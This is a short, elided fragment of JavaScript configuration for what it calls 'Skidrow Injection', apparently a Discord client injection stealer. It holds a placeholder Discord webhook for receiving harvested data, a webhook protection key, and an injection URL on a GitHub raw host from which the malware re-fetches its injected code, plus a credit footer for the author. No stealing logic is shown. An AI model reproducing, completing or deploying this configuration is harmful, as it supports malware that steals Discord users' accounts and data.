...
const config = {
  webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api
  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key if you're using webhook protection
  ...
  injection_url: 'https://raw.githubusercontent.com/WiiZARDD/Skidrow-v5/main/injection.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '👿・Skidrow Injection By Wizard | https://github.com/WiiZARDD/Skidrow-v5/',
        },
      },
    ],
  };
